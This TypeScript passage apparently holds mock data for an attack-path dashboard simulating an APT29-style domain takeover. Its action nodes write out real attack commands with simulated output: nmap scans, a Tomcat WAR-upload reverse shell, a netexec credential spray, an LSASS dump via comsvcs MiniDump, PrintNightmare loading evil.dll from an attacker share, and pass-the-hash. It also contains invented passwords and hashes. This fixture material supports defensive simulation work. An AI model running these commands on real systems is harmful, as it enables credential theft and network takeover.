    { edge_id: 'apt2-nmap-ep11', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep11', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep12', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep12', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep13', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep13', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep14', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep14', edge_type: 'asset_link' },
    { edge_id: 'apt2-nmap-ep15', edge_source: 'apt2-a-nmap-bulk', edge_target: 'apt2-ep15', edge_type: 'asset_link' },
  ],
  attack_path_stats: {
    stats_prevented: 1,
    stats_detected: 3,
    stats_undetected: 18,
    stats_pending: 0,
    stats_total_actions: 23,
    stats_executed_actions: 23,
    stats_captured_endpoints: 14,
    stats_captured_files: 18,
    stats_captured_credentials: 14,
    stats_captured_users: 10,
    stats_captured_cves: 6,
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// SCENARIO 4 – APT29-Style Domain Takeover  (8 endpoints, 10 actions)
// ─────────────────────────────────────────────────────────────────────────────
//
//  Scenario ID : d7f3a2b1-8c4e-4f9a-b2d1-3a5f8e7c6b0a
//  Exercise runs: a9b3c7d1 (full domain takeover), b8e4f2a6 (stopped at prevention)
//
//  Entry   : Nmap external recon → Tomcat admin credential exploit (WEB-APP-01)
//  Chain   : WEB-APP-01 → credential spray (DEV-WS-01 ✓, SALES-WS-01 detected) →
//            LSASS dump on DEV-WS-01 (detected, partial) →
//              Branch A: PrintNightmare on PRINT-SRV-02 → DCSync on CORP-DC-01
//              Branch B: IT admin creds from LSASS → IT-ADMIN-WS-01 → DCSync on CORP-DC-01
//              Branch C: MSSQL brute force → MSSQL-SRV-01 (PREVENTED by firewall)
//  Untouched: BACKUP-NAS-01 (discovered via nmap but no attack launched)
// ─────────────────────────────────────────────────────────────────────────────
export const MOCK_SCENARIO_APT_DOMAIN: AttackPathData = {
  attack_path_nodes: [
    // ── ASSET nodes ──────────────────────────────────────────────────────────
    {
      node_id: 's4-ep01',
      node_type: 'ASSET',
      node_label: 'WEB-APP-01',
      node_hostname: 'WEB-APP-01',
      node_ip: '172.16.0.10',
      node_platform: 'Ubuntu 20.04 LTS',
      node_status: 'undetected',
      node_user_privileges: 'www-data → root (Tomcat exploit)',
      node_accessed_files: ['/opt/tomcat/conf/tomcat-users.xml', '/var/www/config/db.properties'],
      node_credentials_found: ['svc_tomcat:T0mcat@dmin2024'],
      node_zone: 'External DMZ',
      node_subnet: '172.16.0.0/24',
      node_is_entry_point: true,
      node_is_pivot: true,
    node_agents: ['palo_alto', 'sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep02',
      node_type: 'ASSET',
      node_label: 'DEV-WS-01',
      node_hostname: 'DEV-WS-01',
      node_ip: '10.10.1.50',
      node_platform: 'Windows 10',
      node_status: 'undetected',
      node_user_privileges: 'CORP\\svc_tomcat → CORP\\dev.johnson (local session)',
      node_accessed_files: ['C:\\Windows\\Temp\\lsass.dmp'],
      node_credentials_found: [
        'CORP\\dev.johnson:aad3b435b51404eeaad3b435b51404ee:8f4c3b2a1e6d9f7a3c5b8e2d4f6a9c1e',
        'CORP\\it.robertson:aad3b435b51404eeaad3b435b51404ee:3e7a9c2f1b4d6e8a0c5f3b7d9e2a4c6f',
      ],
      node_zone: 'Corp LAN',
      node_subnet: '10.10.1.0/24',
      node_is_pivot: true,
    node_agents: ['palo_alto', 'sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep03',
      node_type: 'ASSET',
      node_label: 'SALES-WS-01',
      node_hostname: 'SALES-WS-01',
      node_ip: '10.10.1.55',
      node_platform: 'Windows 10',
      node_status: 'detected',
      node_user_privileges: 'CORP\\svc_tomcat (session restricted after detection)',
      node_zone: 'Corp LAN',
      node_subnet: '10.10.1.0/24',
    node_agents: ['sentinel_one'],
    },
    {
      node_id: 's4-ep04',
      node_type: 'ASSET',
      node_label: 'IT-ADMIN-WS-01',
      node_hostname: 'IT-ADMIN-WS-01',
      node_ip: '10.10.1.60',
      node_platform: 'Windows 10 Enterprise',
      node_status: 'undetected',
      node_user_privileges: 'CORP\\it.robertson (Domain Admin group)',
      node_accessed_files: [
        'C:\\Users\\it.robertson\\Desktop\\domain_admin_pass.kdbx',
        'C:\\IT\\Scripts\\dc_backup_creds.txt',
      ],
      node_credentials_found: ['CORP\\da.svcadmin:D0m@inAdm1n2024!'],
      node_zone: 'Corp LAN',
      node_subnet: '10.10.1.0/24',
      node_is_pivot: true,
    node_agents: ['palo_alto', 'sentinel_one'],
    },
    {
      node_id: 's4-ep05',
      node_type: 'ASSET',
      node_label: 'PRINT-SRV-02',
      node_hostname: 'PRINT-SRV-02',
      node_ip: '10.10.2.20',
      node_platform: 'Windows Server 2016',
      node_status: 'undetected',
      node_user_privileges: 'NT AUTHORITY\\SYSTEM (via PrintNightmare CVE-2021-1675)',
      node_accessed_files: ['C:\\Windows\\System32\\spool\\drivers\\'],
      node_credentials_found: [
        'PRINT-SRV-02\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:9b4e2c7a5f1d3b8e0a6c4f2d8b9e1c3a',
        'CORP\\svc_print:1108:aad3b435b51404eeaad3b435b51404ee:2d4f8a1c3e7b9d5f1a3c5e7d9b2e4f8a',
      ],
      node_zone: 'Server VLAN',
      node_subnet: '10.10.2.0/24',
      node_is_pivot: true,
    node_agents: ['palo_alto', 'openaev'],
    },
    {
      node_id: 's4-ep06',
      node_type: 'ASSET',
      node_label: 'MSSQL-SRV-01',
      node_hostname: 'MSSQL-SRV-01',
      node_ip: '10.10.2.30',
      node_platform: 'Windows Server 2019',
      node_status: 'prevented',
      node_zone: 'Server VLAN',
      node_subnet: '10.10.2.0/24',
    node_agents: ['sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep07',
      node_type: 'ASSET',
      node_label: 'CORP-DC-01',
      node_hostname: 'CORP-DC-01',
      node_ip: '10.10.3.5',
      node_platform: 'Windows Server 2022',
      node_status: 'undetected',
      node_user_privileges: 'CORP\\Administrator (Domain Admin — DCSync)',
      node_accessed_files: [],
      node_credentials_found: [
        'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a3f7c2e9b4d1a6f3c8e5b7d2a4f9c1e',
        'CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c4f8b2a9e3d7c5a2b6f4d8e1c9a3f7b',
        '284 domain accounts extracted (DCSync)',
      ],
      node_zone: 'Domain',
      node_subnet: '10.10.3.0/24',
    node_agents: ['palo_alto', 'openaev'],
    },
    {
      node_id: 's4-ep08',
      node_type: 'ASSET',
      node_label: 'BACKUP-NAS-01',
      node_hostname: 'BACKUP-NAS-01',
      node_ip: '10.10.2.50',
      node_platform: 'TrueNAS SCALE 23.10',
      node_status: 'pending',
      node_zone: 'Server VLAN',
      node_subnet: '10.10.2.0/24',
      node_untouched: true,
    node_agents: ['palo_alto', 'sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep09',
      node_type: 'ASSET',
      node_label: 'HR-WS-01',
      node_hostname: 'HR-WS-01',
      node_ip: '10.10.1.70',
      node_platform: 'Windows 10',
      node_status: 'detected',
      node_user_privileges: 'CORP\\hr.thompson (partial, session contained)',
      node_zone: 'Corp LAN',
      node_subnet: '10.10.1.0/24',
    node_agents: ['sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep10',
      node_type: 'ASSET',
      node_label: 'FINANCE-WS-01',
      node_hostname: 'FINANCE-WS-01',
      node_ip: '10.10.1.80',
      node_platform: 'Windows 10 Pro',
      node_status: 'undetected',
      node_user_privileges: 'CORP\\fin.martinez (User) → CORP\\svc_finance (local admin)',
      node_accessed_files: ['C:\\Finance\\YearEnd_2024.xlsx', 'C:\\Finance\\Payroll_Master.xlsx'],
      node_credentials_found: ['CORP\\svc_finance:F1nanc3@2024!'],
      node_zone: 'Corp LAN',
      node_subnet: '10.10.1.0/24',
    node_agents: ['sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep11',
      node_type: 'ASSET',
      node_label: 'MGMT-WS-01',
      node_hostname: 'MGMT-WS-01',
      node_ip: '10.10.1.90',
      node_platform: 'Windows 10 Enterprise',
      node_status: 'prevented',
      node_zone: 'Corp LAN',
      node_subnet: '10.10.1.0/24',
    node_agents: ['sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep12',
      node_type: 'ASSET',
      node_label: 'APP-SRV-01',
      node_hostname: 'APP-SRV-01',
      node_ip: '10.10.2.10',
      node_platform: 'RHEL 8.6',
      node_status: 'undetected',
      node_is_pivot: true,
      node_user_privileges: 'appuser → root (sudo misconfiguration)',
      node_accessed_files: ['/opt/app/config/db.properties', '/opt/app/config/ldap.conf'],
      node_credentials_found: ['svc_webapp:W3bApp@Prod!', 'ldap_bind:L3ap@Corp2024'],
      node_zone: 'Server VLAN',
      node_subnet: '10.10.2.0/24',
    node_agents: ['palo_alto', 'openaev'],
    },
    {
      node_id: 's4-ep13',
      node_type: 'ASSET',
      node_label: 'FILE-SRV-01',
      node_hostname: 'FILE-SRV-01',
      node_ip: '10.10.2.40',
      node_platform: 'Windows Server 2019',
      node_status: 'detected',
      node_user_privileges: 'CORP\\svc_finance (partial read access before detection)',
      node_zone: 'Server VLAN',
      node_subnet: '10.10.2.0/24',
    node_agents: ['sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep14',
      node_type: 'ASSET',
      node_label: 'REDIS-CACHE-01',
      node_hostname: 'REDIS-CACHE-01',
      node_ip: '10.10.2.60',
      node_platform: 'Ubuntu 22.04 LTS',
      node_status: 'prevented',
      node_zone: 'Server VLAN',
      node_subnet: '10.10.2.0/24',
    node_agents: ['palo_alto', 'sentinel_one'],
    },
    {
      node_id: 's4-ep15',
      node_type: 'ASSET',
      node_label: 'JUMP-SRV-01',
      node_hostname: 'JUMP-SRV-01',
      node_ip: '10.10.3.10',
      node_platform: 'Windows Server 2019',
      node_status: 'undetected',
      node_is_pivot: true,
      node_user_privileges: 'CORP\\svc_jumphost (Service Account) → SYSTEM',
      node_accessed_files: ['C:\\JumpAdmin\\bastion_creds_vault.txt'],
      node_credentials_found: ['CORP\\da.svcadmin:D0m@inAdm1n2024! (confirmed plaintext backup)'],
      node_zone: 'Domain',
      node_subnet: '10.10.3.0/24',
    node_agents: ['palo_alto', 'sentinel_one'],
    },
    {
      node_id: 's4-ep16',
      node_type: 'ASSET',
      node_label: 'SECONDARY-DC-01',
      node_hostname: 'SECONDARY-DC-01',
      node_ip: '10.10.3.6',
      node_platform: 'Windows Server 2019',
      node_status: 'undetected',
      node_user_privileges: 'CORP\\Administrator (Domain Admin via replication)',
      node_credentials_found: ['All CORP domain accounts replicated from CORP-DC-01'],
      node_zone: 'Domain',
      node_subnet: '10.10.3.0/24',
    node_agents: ['sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep17',
      node_type: 'ASSET',
      node_label: 'MONITORING-01',
      node_hostname: 'MONITORING-01',
      node_ip: '10.10.4.10',
      node_platform: 'Ubuntu 22.04 LTS',
      node_status: 'prevented',
      node_zone: 'OT/Monitoring',
      node_subnet: '10.10.4.0/24',
    node_agents: ['palo_alto'],
    },
    {
      node_id: 's4-ep18',
      node_type: 'ASSET',
      node_label: 'LEGACY-WIN-01',
      node_hostname: 'LEGACY-WIN-01',
      node_ip: '10.10.1.200',
      node_platform: 'Windows 7 SP1',
      node_status: 'pending',
      node_untouched: true,
      node_zone: 'Corp LAN',
      node_subnet: '10.10.1.0/24',
    node_agents: ['palo_alto'],
    },
    {
      node_id: 's4-ep19',
      node_type: 'ASSET',
      node_label: 'VOIP-GW-01',
      node_hostname: 'VOIP-GW-01',
      node_ip: '10.10.1.210',
      node_platform: 'CentOS 7',
      node_status: 'pending',
      node_untouched: true,
      node_zone: 'Corp LAN',
      node_subnet: '10.10.1.0/24',
    node_agents: ['sentinel_one', 'openaev'],
    },
    {
      node_id: 's4-ep20',
      node_type: 'ASSET',
      node_label: 'ARCHIVE-SRV-01',
      node_hostname: 'ARCHIVE-SRV-01',
      node_ip: '10.10.4.20',
      node_platform: 'Ubuntu 18.04 LTS',
      node_status: 'pending',
      node_untouched: true,
      node_zone: 'OT/Monitoring',
      node_subnet: '10.10.4.0/24',
    node_agents: ['sentinel_one'],
    },

    // ── ACTION nodes ──────────────────────────────────────────────────────────

    // Phase 1 – External Recon
    {
      node_id: 's4-a01',
      node_type: 'ACTION',
      node_label: 'Nmap External SYN Scan',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan',
      node_command: 'nmap -sS -sV -T4 -p 22,80,443,8080,8443,8009,3306',
      node_arguments: '--script=default,version --timing=T4 --host-timeout=30s 172.16.0.10',
      node_executed_at: '2025-03-22T07:00:00Z',
      node_agent: 'openaev',
      node_ip: '172.16.0.10',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org ) at 2025-03-22 07:00 UTC
Nmap scan report for 172.16.0.10
Host is up (0.0021s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp    open     http       Apache httpd 2.4.41 ((Ubuntu))
443/tcp   open     ssl/https  Apache httpd 2.4.41
8080/tcp  open     http       Apache Tomcat 9.0.31
8443/tcp  open     ssl/https  Apache Tomcat 9.0.31
8009/tcp  open     ajp13      Apache Jserv (Protocol v1.3)
3306/tcp  filtered mysql
OS details: Linux 5.4 - 5.15
Uptime guess: 47.213 days
Network Distance: 3 hops
Nmap done: 1 IP address (1 host up) scanned in 4.17 seconds`,
    },

    // Phase 1b – Corp LAN Recon
    {
      node_id: 's4-a01b',
      node_type: 'ACTION',
      node_label: 'Nmap Corp LAN Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan (Corp LAN)',
      node_command: 'nmap -sS -sV -T4 -p 135,139,445,3389',
      node_arguments: '--script=smb-security-mode,smb-os-discovery 10.10.1.0/24',
      node_executed_at: '2025-03-22T07:06:00Z',
      node_agent: 'openaev',
      node_ip: '10.10.1.0/24',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org ) at 2025-03-22 07:06 UTC
Nmap scan report for 10.10.1.50 (DEV-WS-01)
Host is up (0.0012s latency).
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 10 microsoft-ds (workgroup: CORP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
MAC Address: 00:50:56:A1:2C:44 (VMware)
OS details: Windows 10 19041

Nmap scan report for 10.10.1.55 (SALES-WS-01)
Host is up (0.0011s latency).
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server

Nmap scan report for 10.10.1.60 (IT-ADMIN-WS-01)
Host is up (0.0014s latency).
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds  (signing:True)
3389/tcp  filtered ms-wbt-server

Nmap done: 254 IP addresses (3 hosts up) scanned in 22.4 seconds`,
    },

    // Phase 2 – Initial Exploitation
    {
      node_id: 's4-a02',
      node_type: 'ACTION',
      node_label: 'Nuclei Tomcat Manager RCE',
      node_status: 'undetected',
      node_payload_name: 'nuclei – CVE-2020-1938 / Tomcat-Manager-RCE',
      node_command: 'nuclei -u http://172.16.0.10:8080/manager/',
      node_arguments: '-t nuclei-templates/cves/2020/CVE-2020-1938.yaml -rate-limit 100 -silent',
      node_executed_at: '2025-03-22T07:04:11Z',
      node_agent: 'sentinel_one',
      node_ip: '172.16.0.10',
      node_user_privileges: 'www-data → root',
      node_accessed_files: ['/opt/tomcat/conf/tomcat-users.xml', '/var/www/config/db.properties'],
      node_credentials_found: ['svc_tomcat:T0mcat@dmin2024'],
      node_terminal_output: `[INF] nuclei v3.2.4 — Fast and customizable vulnerability scanner
[INF] Loading templates: CVE-2020-1938 (Ghostcat AJP), tomcat-default-login, tomcat-manager-rce
[INF] Scanning 172.16.0.10:8080 ...

[tomcat-default-login] [http] [medium] http://172.16.0.10:8080/manager/html
  → Trying admin:admin ... FAILED
  → Trying tomcat:tomcat ... FAILED
  → Trying manager:manager ... FAILED

[*] Probing /WEB-INF/web.xml via AJP (CVE-2020-1938 / Ghostcat)...
[CVE-2020-1938] [network] [critical] 172.16.0.10:8009 — AJP file inclusion confirmed
[+] /opt/tomcat/conf/tomcat-users.xml retrieved:
    <user username="svc_tomcat" password="T0mcat@dmin2024" roles="manager-gui,admin-gui"/>

[tomcat-manager-rce] [http] [critical] http://172.16.0.10:8080/manager/html
[*] Uploading malicious WAR: /opt/nuclei/payloads/shell.war (svc_tomcat:T0mcat@dmin2024)
[+] WAR deployed successfully to /shell/
[+] RCE confirmed: GET /shell/cmd?c=id → uid=0(root) gid=0(root)
[*] Reading /var/www/config/db.properties:
    db.host=10.10.2.30
    db.user=svc_webapp
    db.pass=W3bApp@Prod!
[+] Reverse shell spawned: root@WEB-APP-01:/opt/tomcat #
[+] Credentials stored: svc_tomcat:T0mcat@dmin2024`,
    },

    // Phase 3 – Internal SMB Discovery
    {
      node_id: 's4-a03',
      node_type: 'ACTION',
      node_label: 'Netexec SMB Internal Discovery',
      node_status: 'undetected',
      node_payload_name: 'netexec – SMB network scan',
      node_command: 'netexec smb 10.10.1.0/24',
      node_arguments: '-u "corp\\svc_tomcat" -p "T0mcat@dmin2024" --shares -M spider_plus',
      node_executed_at: '2025-03-22T07:09:33Z',
      node_agent: 'openaev',
      node_ip: '10.10.1.0/24',
      node_terminal_output: `SMB   10.10.1.1    445              [*] Starting SMB host discovery on 10.10.1.0/24 and 10.10.2.0/24
SMB   10.10.1.50   445    DEV-WS-01      [*] Windows 10.0 Build 19041 x64 (name:DEV-WS-01) (domain:CORP) (signing:False) (SMBv1:False)
SMB   10.10.1.55   445    SALES-WS-01    [*] Windows 10.0 Build 19041 x64 (name:SALES-WS-01) (domain:CORP) (signing:False) (SMBv1:False)
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [*] Windows 10.0 Build 19041 x64 (name:IT-ADMIN-WS-01) (domain:CORP) (signing:True) (SMBv1:False)
SMB   10.10.2.20   445    PRINT-SRV-02   [*] Windows Server 2016 Build 14393 x64 (name:PRINT-SRV-02) (domain:CORP) (signing:False) (SMBv1:False)
SMB   10.10.2.30   445    MSSQL-SRV-01   [*] Windows Server 2019 Build 17763 x64 (name:MSSQL-SRV-01) (domain:CORP) (signing:True) (SMBv1:False)
SMB   10.10.3.5    445    CORP-DC-01     [*] Windows Server 2022 Build 20348 x64 (name:CORP-DC-01) (domain:CORP) (signing:True) (SMBv1:True)
[*] Hosts with SMB signing disabled (relay candidates): DEV-WS-01, SALES-WS-01, PRINT-SRV-02
[*] Scan complete — 6 active hosts discovered
Runtime: 8.3s | 6 hosts up | 3 relay-vulnerable`,
    },

    // Phase 4 – Credential Spray (multi-endpoint: DEV + SALES)
    {
      node_id: 's4-a04',
      node_type: 'ACTION',
      node_label: 'Netexec SMB Credential Spray',
      node_status: 'detected',
      node_payload_name: 'netexec – SMB credential spray',
      node_executed_at: '2025-03-22T07:12:05Z',
      node_agent: 'openaev',
      node_ip: '10.10.1.50',
      node_hostname: 'DEV-WS-01 + SALES-WS-01',
      node_user_privileges: 'CORP\\svc_tomcat',
      node_accessed_files: [],
      node_credentials_found: [],
      node_expectations: [{ expectation_id: 's4-e1', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }],
      node_terminal_output: `netexec smb 10.10.1.50 10.10.1.55 -u svc_tomcat -p 'T0mcat@dmin2024'

SMB   10.10.1.50   445    DEV-WS-01      [*] Windows 10.0 Build 19041 x64 (domain:CORP) (signing:False)
SMB   10.10.1.50   445    DEV-WS-01      [+] CORP\\svc_tomcat:T0mcat@dmin2024 (Pwn3d!)
SMB   10.10.1.50   445    DEV-WS-01      [*] Enumerating shares: ADMIN$, C$, IPC$, DevShare
SMB   10.10.1.50   445    DEV-WS-01      [+] User CORP\\dev.johnson is currently logged in

SMB   10.10.1.55   445    SALES-WS-01    [*] Windows 10.0 Build 19041 x64 (domain:CORP) (signing:False)
SMB   10.10.1.55   445    SALES-WS-01    [+] CORP\\svc_tomcat:T0mcat@dmin2024 — Auth success (session restricted)
[!] DETECTION: Microsoft Defender for Endpoint alert on SALES-WS-01
[!] SIEM Alert (07:12:34Z): SMB_SUSPICIOUS_LOGIN | Source: 172.16.0.10 → 10.10.1.55
[!] Alert ID: ALP-2025-0322-0047 | Severity: Medium | Rule: NonDomainSourceSMBLogin
[*] SALES-WS-01: Session isolated — further enumeration blocked
[*] DEV-WS-01: Undetected — session active and fully accessible

Runtime: 3.1s | 2 hosts sprayed | 2 auth successes | 1 DETECTION (SALES-WS-01)`,
    },

    // Phase 5 – LSASS Dump on DEV-WS-01 (detected, partial)
    {
      node_id: 's4-a05',
      node_type: 'ACTION',
      node_label: 'Netexec WMI LSASS Dump',
      node_status: 'detected',
      node_payload_name: 'netexec – WMI lsassy (comsvcs MiniDump)',
      node_executed_at: '2025-03-22T07:16:48Z',
      node_agent: 'palo_alto',
      node_ip: '10.10.1.50',
      node_credentials_found: [
        'CORP\\dev.johnson:8f4c3b2a1e6d9f7a3c5b8e2d4f6a9c1e (NTLM)',
        'CORP\\it.robertson:3e7a9c2f1b4d6e8a0c5f3b7d9e2a4c6f (NTLM)',
      ],
      node_expectations: [{ expectation_id: 's4-e2', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }],
      node_terminal_output: `WMI   10.10.1.50   135    DEV-WS-01      [*] Connecting via WMI (CORP\\svc_tomcat:T0mcat@dmin2024)
WMI   10.10.1.50   135    DEV-WS-01      [+] Auth OK — Windows 10.0 Build 19041 Enterprise x64
WMI   10.10.1.50   135    DEV-WS-01      [*] LSASS PID: 620
WMI   10.10.1.50   135    DEV-WS-01      [*] Executing: rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump 620 C:\\Windows\\Temp\\lsass.dmp full
WMI   10.10.1.50   135    DEV-WS-01      [+] Dump file created: C:\\Windows\\Temp\\lsass.dmp (47.2 MB)
WMI   10.10.1.50   135    DEV-WS-01      [*] Copying dump to attacker host via SMB C$ ...

[+] Partial credential extraction before detection:
    CORP\\dev.johnson  NTHash: 8f4c3b2a1e6d9f7a3c5b8e2d4f6a9c1e  (local session cached)
    CORP\\it.robertson NTHash: 3e7a9c2f1b4d6e8a0c5f3b7d9e2a4c6f  (logged-in IT admin)

[!] DETECTION: Windows Defender ATP — Suspicious Process Access to LSASS (T1003.001)
[!] SIEM Alert (07:14:52Z): LSASS_CREDENTIAL_DUMP | Host: DEV-WS-01 | PID: 4892 (rundll32)
[!] Alert ID: ALP-2025-0322-0051 | Severity: High | Analyst: jthomas@corp.local notified
[*] Attacker pauses 8 minutes — waiting for SOC investigation to de-escalate...
[*] LSASS dump partially exfiltrated before containment — 2 NTLM hashes recovered
[+] Pivot target identified: CORP\\it.robertson is member of Domain Admins (LDAP confirmed)`,
    },

    // Phase 6 – PrintNightmare (Branch A)
    {
      node_id: 's4-a06',
      node_type: 'ACTION',
      node_label: 'Netexec SMB PrintNightmare',
      node_status: 'undetected',
      node_payload_name: 'netexec – SMB printnightmare (CVE-2021-1675)',
      node_executed_at: '2025-03-22T07:31:17Z',
      node_agent: 'openaev',
      node_ip: '10.10.2.20',
      node_user_privileges: 'NT AUTHORITY\\SYSTEM',
      node_accessed_files: ['C:\\Windows\\System32\\spool\\drivers\\'],
      node_credentials_found: [
        'PRINT-SRV-02\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:9b4e2c7a5f1d3b8e0a6c4f2d8b9e1c3a',
        'CORP\\svc_print:1108:aad3b435b51404eeaad3b435b51404ee:2d4f8a1c3e7b9d5f1a3c5e7d9b2e4f8a',
      ],
      node_terminal_output: `SMB   10.10.2.20   445    PRINT-SRV-02   [*] Windows Server 2016 Build 14393 x64 (domain:CORP) (signing:False)
SMB   10.10.2.20   445    PRINT-SRV-02   [*] Checking PrintNightmare (CVE-2021-1675 / MS-RPRN)...
SMB   10.10.2.20   445    PRINT-SRV-02   [+] Spooler service (spoolsv.exe, PID 1288) is RUNNING
SMB   10.10.2.20   445    PRINT-SRV-02   [+] Target is VULNERABLE — patch KB5004945 not applied
SMB   10.10.2.20   445    PRINT-SRV-02   [*] Starting temporary SMB share on attacker: \\\\172.16.0.10\\share
SMB   10.10.2.20   445    PRINT-SRV-02   [*] Uploading malicious DLL: \\\\172.16.0.10\\share\\evil.dll
SMB   10.10.2.20   445    PRINT-SRV-02   [*] Calling RpcAddPrinterDriverEx via MS-RPRN (AddPrinterDriver)...
SMB   10.10.2.20   445    PRINT-SRV-02   [+] DLL executed as SYSTEM — privilege escalation confirmed!
SMB   10.10.2.20   445    PRINT-SRV-02   [*] Spawning SYSTEM reverse shell via schtasks persistence
SMB   10.10.2.20   445    PRINT-SRV-02   [+] whoami: nt authority\\system
SMB   10.10.2.20   445    PRINT-SRV-02   [*] Dumping SAM hive (reg save HKLM\\SAM C:\\Temp\\sam.hive)...
SMB   10.10.2.20   445    PRINT-SRV-02   [+] PRINT-SRV-02\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:9b4e2c7a5f1d3b8e0a6c4f2d8b9e1c3a
SMB   10.10.2.20   445    PRINT-SRV-02   [+] CORP\\svc_print:1108:aad3b435b51404eeaad3b435b51404ee:2d4f8a1c3e7b9d5f1a3c5e7d9b2e4f8a
[+] SYSTEM on PRINT-SRV-02 — domain credential reuse path to DC now available`,
    },

    // Phase 7 – MSSQL Brute Force (PREVENTED – Branch C)
    {
      node_id: 's4-a07',
      node_type: 'ACTION',
      node_label: 'Netexec MSSQL SA Brute Force',
      node_status: 'prevented',
      node_payload_name: 'netexec – MSSQL SA brute force',
      node_executed_at: '2025-03-22T07:31:22Z',
      node_agent: 'sentinel_one',
      node_ip: '10.10.2.30',
      node_expectations: [{ expectation_id: 's4-e3', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }],
      node_terminal_output: `MSSQL 10.10.2.30   1433   MSSQL-SRV-01   [*] Attempting TCP connection to 10.10.2.30:1433...
MSSQL 10.10.2.30   1433   MSSQL-SRV-01   [-] Connection attempt 1/3: TCP timeout (5000ms)
MSSQL 10.10.2.30   1433   MSSQL-SRV-01   [-] Connection attempt 2/3: TCP timeout (5000ms)
MSSQL 10.10.2.30   1433   MSSQL-SRV-01   [-] Connection attempt 3/3: TCP timeout (5000ms)
[!] PREVENTION: Perimeter firewall rule FW-RULE-104 blocking inbound TCP/1433
[!] Network ACL: Server VLAN → MSSQL port 1433 restricted to approved management hosts only
[!] Source 172.16.0.10 is NOT in approved MSSQL client allowlist (10.10.99.0/24)
[-] All 3 TCP connection attempts FAILED — port 1433 filtered/dropped
[-] Attack PREVENTED — network segmentation policy enforced for MSSQL service
[*] Alternate path required — pivoting via IT admin workstation credentials (LSASS dump)`,
    },

    // Phase 8 – IT Admin Credentials Pivot (Branch B)
    {
      node_id: 's4-a08',
      node_type: 'ACTION',
      node_label: 'Netexec SMB IT Admin Pivot',
      node_status: 'undetected',
      node_payload_name: 'netexec – SMB pass-the-hash (IT admin)',
      node_command: 'netexec smb 10.10.1.60',
      node_arguments: '-u "corp\\it.robertson" -H "3e7a9c2f1b4d6e8a0c5f3b7d9e2a4c6f" --shares -M spider_plus',
      node_executed_at: '2025-03-22T07:33:04Z',
      node_agent: 'sentinel_one',
      node_ip: '10.10.1.60',
      node_user_privileges: 'CORP\\it.robertson (Domain Admin group)',
      node_accessed_files: ['C:\\IT\\Scripts\\dc_backup_creds.txt', 'C:\\Users\\it.robertson\\Desktop\\domain_admin_pass.kdbx'],
      node_credentials_found: ['CORP\\da.svcadmin:D0m@inAdm1n2024!'],
      node_terminal_output: `SMB   10.10.1.60   445    IT-ADMIN-WS-01 [*] Windows 10.0 Build 19041 Enterprise x64 (domain:CORP) (signing:True)
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [*] Authenticating with NTLM hash (from DEV-WS-01 LSASS dump)
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [+] CORP\\it.robertson:3e7a9c2f1b4d6e8a0c5f3b7d9e2a4c6f (Pwn3d!)
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [*] Checking group memberships for it.robertson...
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [+] Member of: CORP\\IT-Admins, CORP\\Domain Admins, CORP\\Enterprise Admins
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [*] Spidering C:\\IT\\Scripts\\ ...
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [+] Found: C:\\IT\\Scripts\\dc_backup_creds.txt (1.2 KB)
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [*] Downloading: C:\\IT\\Scripts\\dc_backup_creds.txt
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [+] File contents:
    # DC Backup Service Account — DO NOT SHARE
    Username: CORP\\da.svcadmin
    Password: D0m@inAdm1n2024!
    Last updated: 2025-02-14
SMB   10.10.1.60   445    IT-ADMIN-WS-01 [+] Also found: domain_admin_pass.kdbx (KeePass DB — deferred)
[+] Domain Admin plaintext credential recovered: CORP\\da.svcadmin:D0m@inAdm1n2024!
[+] DC pivot now possible — proceeding to DCSync`,
    },

    // Phase 9 – DCSync on CORP-DC-01 (converge from Branch A + B)
    {
      node_id: 's4-a09',
